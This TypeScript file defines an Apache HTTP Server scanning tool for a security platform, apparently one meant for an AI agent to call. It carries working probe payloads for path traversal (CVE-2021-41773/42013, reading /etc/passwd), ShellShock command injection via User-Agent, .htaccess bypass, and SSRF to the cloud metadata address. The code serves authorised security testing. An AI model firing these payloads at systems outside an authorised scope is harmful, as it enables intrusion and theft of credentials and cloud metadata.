// apache stack checks — ported 1:1 from infra-security-mcp `providers/apache`.
// Every path/payload/condition matches the source exactly; only the transport
// (scope-guarded webhook sender) and the Check/severity adapter are CyberStrike's.
import z from "zod"
import { defineWebhookTool } from "../define"
import type { HttpSender } from "../transport"
import { get, header, failed, ok, base, summarize, type Check } from "./shared"

export namespace Apache {
  export async function versionDetect(sender: HttpSender, origin: string): Promise<Check> {
    const [main, notFound] = await Promise.all([get(sender, origin), get(sender, `${origin}/__nonexistent_${Date.now()}__`)])
    const serverHeader = (ok(main) ? header(main, "server") : "") || (ok(notFound) ? header(notFound, "server") : "")
    const body = ok(notFound) ? notFound.body : ""
    const versionMatch = serverHeader.match(/Apache\/([\d.]+)/i)
    const modules: string[] = []
    const modMatches = serverHeader.matchAll(/(mod_\w+|OpenSSL\/[\d.]+\w*|PHP\/[\d.]+)/gi)
    for (const m of modMatches) modules.push(m[1])
    const osHints: string[] = []
    if (/\(Ubuntu\)/i.test(serverHeader)) osHints.push("Ubuntu")
    if (/\(Debian\)/i.test(serverHeader)) osHints.push("Debian")
    if (/\(CentOS\)/i.test(serverHeader)) osHints.push("CentOS")
    if (/\(Red Hat\)/i.test(serverHeader)) osHints.push("Red Hat")
    if (/\(Unix\)/i.test(serverHeader)) osHints.push("Unix")
    if (/\(Win64\)|Win32/i.test(serverHeader)) osHints.push("Windows")
    const bodyVersion = body.match(/Apache\/([\d.]+)/i)
    const isApache = serverHeader.toLowerCase().includes("apache") || body.toLowerCase().includes("apache")
    if (!isApache) return { check: "version_detect", hit: false, severity: "info", detail: "Apache not detected" }
    const ver = versionMatch?.[1] ?? bodyVersion?.[1] ?? null
    return {
      check: "version_detect",
      hit: true,
      severity: ver ? "low" : "info",
      detail: `Apache${ver ? ` ${ver}` : ""} detected${modules.length ? ` [${modules.join(", ")}]` : ""}${osHints.length ? ` (${osHints.join("/")})` : ""}${bodyVersion ? " (error page leaks version)" : ""}`,
      evidence: serverHeader || (bodyVersion ? bodyVersion[0] : "Apache"),
    }
  }

  export async function serverStatus(sender: HttpSender, origin: string): Promise<Check> {
    const endpoints = [
      { path: "/server-status", type: "mod_status" },
      { path: "/server-status?auto", type: "mod_status_auto" },
      { path: "/server-info", type: "mod_info" },
      { path: "/server-info?auto", type: "mod_info_auto" },
    ]
    for (const ep of endpoints) {
      const res = await get(sender, `${origin}${ep.path}`)
      if (failed(res)) continue
      const isStatus =
        res.status === 200 &&
        (res.body.includes("Apache Server Status") ||
          res.body.includes("Total Accesses") ||
          res.body.includes("Scoreboard") ||
          res.body.includes("Server Version"))
      const isInfo =
        res.status === 200 && (res.body.includes("Apache Server Information") || res.body.includes("Module Name"))
      if (isStatus || isInfo)
        return { check: "server_status", hit: true, severity: "medium", detail: `Apache ${ep.type} exposed at ${ep.path}`, evidence: res.body.substring(0, 2000) }
    }
    return { check: "server_status", hit: false, severity: "info", detail: "mod_status/mod_info not exposed" }
  }

  export async function htaccessBypass(sender: HttpSender, origin: string): Promise<Check> {
    const protectedPath = "/admin"
    const htaccessPaths = [
      "/.htaccess",
      "/.htpasswd",
      "/%2e%68%74%61%63%63%65%73%73",
      "/.ht%61ccess",
      "/.htaccess~",
      "/.htaccess.bak",
      "/.htaccess.old",
      "/.htaccess.swp",
    ]
    const bypassPayloads = [
      `${protectedPath}`,
      `${protectedPath}/`,
      `${protectedPath}%20`,
      `${protectedPath}%0a`,
      `${protectedPath}/.`,
      `${protectedPath}..;/`,
      `${protectedPath}%2f`,
      `/${protectedPath.slice(1).split("").join("%00")}`,
    ]
    for (const hp of htaccessPaths) {
      const res = await get(sender, `${origin}${hp}`)
      if (failed(res)) continue
      if (
        res.status === 200 &&
        (res.body.includes("RewriteRule") ||
          res.body.includes("Deny from") ||
          res.body.includes("AuthType") ||
          res.body.includes("Require ") ||
          res.body.includes("Order "))
      )
        return { check: "htaccess_bypass", hit: true, severity: "high", detail: `.htaccess/.htpasswd exposed at ${hp}`, evidence: res.body.substring(0, 1000) }
    }
    const baseline = await get(sender, `${origin}${protectedPath}`)
    if (!failed(baseline)) {
      for (const bp of bypassPayloads.slice(1)) {
        const res = await get(sender, `${origin}${bp}`)
        if (failed(res)) continue
        const bypassLikely = (baseline.status === 401 || baseline.status === 403) && res.status === 200
        if (bypassLikely)
          return { check: "htaccess_bypass", hit: true, severity: "high", detail: `.htaccess restriction bypass on ${protectedPath} via ${bp}`, evidence: `baseline=${baseline.status} ${bp}=${res.status}` }
      }
    }
    return { check: "htaccess_bypass", hit: false, severity: "info", detail: "no .htaccess leak or restriction bypass" }
  }

  export async function modProxySsrf(sender: HttpSender, origin: string): Promise<Check> {
    const internalTargets = [
      "http://127.0.0.1",
      "http://127.0.0.1:8080",
      "http://localhost",
      "http://169.254.169.254/latest/meta-data/",
      "http://[::1]",
    ]
    for (const internal of internalTargets) {
      const res = await get(sender, internal, { Host: new URL(origin).host })
      if (failed(res)) continue
      if (res.status === 200 && res.body.length > 0)
        return { check: "mod_proxy_ssrf", hit: true, severity: "high", detail: `mod_proxy forward-proxy SSRF: GET ${internal} via proxy`, evidence: res.body.substring(0, 500) }
    }
    const proxyPaths = [
      "/proxy/127.0.0.1",
      "/proxy/localhost",
      "/redirect?url=http://127.0.0.1",
      "/?url=http://127.0.0.1",
      "/fetch?target=http://127.0.0.1",
    ]
    for (const pp of proxyPaths) {
      const res = await get(sender, `${origin}${pp}`)
      if (failed(res)) continue
      if (res.status === 200 && (res.body.includes("<!DOCTYPE") || res.body.includes("<html")) && res.body.length > 100)
        return { check: "mod_proxy_ssrf", hit: true, severity: "high", detail: `mod_proxy path-based SSRF at ${pp}`, evidence: res.body.substring(0, 500) }
    }
    return { check: "mod_proxy_ssrf", hit: false, severity: "info", detail: "no mod_proxy SSRF" }
  }

  export async function pathTraversal(sender: HttpSender, origin: string): Promise<Check> {
    const payloads = [
      // CVE-2021-41773 (Apache 2.4.49)
      { cve: "CVE-2021-41773", path: "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" },
      { cve: "CVE-2021-41773", path: "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" },
      // CVE-2021-42013 (Apache 2.4.50 — bypass of 41773 fix)
      { cve: "CVE-2021-42013", path: "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd" },
      { cve: "CVE-2021-42013", path: "/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd" },
      // General traversal patterns
      { cve: "generic", path: "/..%2f..%2f..%2f..%2f..%2fetc/passwd" },
      { cve: "generic", path: "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" },
    ]
    for (const p of payloads) {
      const res = await get(sender, `${origin}${p.path}`)
      if (failed(res)) continue
      const isVuln = res.status === 200 && res.body.includes("root:") && res.body.includes("/bin/")
      if (isVuln)
        return { check: "path_traversal", hit: true, severity: "critical", detail: `Apache path traversal (${p.cve}) at ${p.path}`, evidence: res.body.substring(0, 500) }
    }
    const verRes = await get(sender, `${origin}/__does_not_exist__`)
    const detectedVersion = (ok(verRes) ? header(verRes, "server") : "").match(/Apache\/([\d.]+)/)?.[1] ?? null
    const versionVulnerable = detectedVersion === "2.4.49" || detectedVersion === "2.4.50"
    if (versionVulnerable)
      return { check: "path_traversal", hit: false, severity: "high", detail: `Apache ${detectedVersion} is known-vulnerable to CVE-2021-41773/42013 but traversal not confirmed`, evidence: `Apache/${detectedVersion}` }
    return { check: "path_traversal", hit: false, severity: "info", detail: "no path traversal confirmed" }
  }

  export async function cgiRce(sender: HttpSender, origin: string): Promise<Check> {
    const cgiPaths = ["/cgi-bin/", "/cgi-bin/printenv", "/cgi-bin/test-cgi", "/cgi-bin/env.cgi", "/cgi-bin/php", "/cgi-bin/php5", "/cgi-bin/status"]
    for (const cp of cgiPaths) {
      const res = await get(sender, `${origin}${cp}`)
      if (failed(res) || res.status !== 200) continue
      const hasCgiOutput =
        res.body.includes("SERVER_SOFTWARE") ||
        res.body.includes("DOCUMENT_ROOT") ||
        res.body.includes("REMOTE_ADDR") ||
        res.body.includes("QUERY_STRING") ||
        res.body.includes("PATH=")
      // ShellShock test (CVE-2014-6271): inject via User-Agent, check for echo
      const shellshockRes = await get(sender, `${origin}${cp}`, { "User-Agent": "() { :; }; echo; echo SHELLSHOCK_TEST_MARKER" })
      if (ok(shellshockRes) && shellshockRes.body.includes("SHELLSHOCK_TEST_MARKER"))
        return { check: "cgi_rce", hit: true, severity: "critical", detail: `ShellShock (CVE-2014-6271) RCE at ${cp}`, evidence: shellshockRes.body.substring(0, 500) }
      if (hasCgiOutput)
        return { check: "cgi_rce", hit: true, severity: "medium", detail: `exposed CGI endpoint leaking env at ${cp}`, evidence: res.body.substring(0, 1000) }
    }
    return { check: "cgi_rce", hit: false, severity: "info", detail: "no exposed CGI / ShellShock" }
  }

  const RUNNERS: Record<string, (s: HttpSender, o: string) => Promise<Check>> = {
    version_detect: versionDetect,
    server_status: serverStatus,
    htaccess_bypass: htaccessBypass,
    mod_proxy_ssrf: modProxySsrf,
    path_traversal: pathTraversal,
    cgi_rce: cgiRce,
  }

  export async function run(sender: HttpSender, origin: string, which: string): Promise<Check[]> {
    const names = which === "all" ? Object.keys(RUNNERS) : [which]
    const out: Check[] = []
    for (const n of names) out.push(await RUNNERS[n](sender, origin))
    return out
  }
}

const DESCRIPTION = `Apache HTTP Server deterministic checks (version/module/OS disclosure, mod_status & mod_info exposure, .htaccess leak + restriction bypass, mod_proxy SSRF, path traversal CVE-2021-41773/42013, CGI exposure + ShellShock CVE-2014-6271). 1:1 port of the infra-security apache provider.

Run after Vortex fingerprints Apache. Probes go through the scope-guarded replay engine. check="all" (default) runs every check.`

export const ApacheTestTool = defineWebhookTool({
  name: "apache_test",
  description: DESCRIPTION,
  parameters: z.object({
    target: z.string().describe("Target origin or URL (e.g. https://target.com)."),
    check: z
      .enum(["all", "version_detect", "server_status", "htaccess_bypass", "mod_proxy_ssrf", "path_traversal", "cgi_rce"])
      .default("all")
      .describe("Which check to run; 'all' runs every apache check."),
  }),
  async run(params, ctx) {
    const origin = base(params.target)
    const results = await Apache.run(ctx.sender, origin, params.check)
    return { target: origin, results }
  },
  format(r) {
    return summarize("apache_test", r.target, r.results)
  },
})
